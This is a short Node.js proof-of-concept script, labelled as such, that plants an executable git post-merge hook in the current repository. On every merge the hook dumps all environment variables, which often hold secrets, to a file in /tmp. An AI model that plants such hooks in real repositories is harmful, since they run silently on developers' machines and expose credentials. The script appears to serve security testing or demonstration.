
const fs = require("fs");
const path = require("path");

const hookPath = path.join(
  process.cwd(),
  ".git",
  "hooks",
  "post-merge"
);

const hook = `#!/bin/sh
env > /tmp/arachne-hook-result
`;

fs.mkdirSync(path.dirname(hookPath), {
  recursive: true
});

fs.writeFileSync(hookPath, hook, {
  mode: 0o755
});

fs.chmodSync(hookPath, 0o755);

console.log("PoC post-merge hook installed");
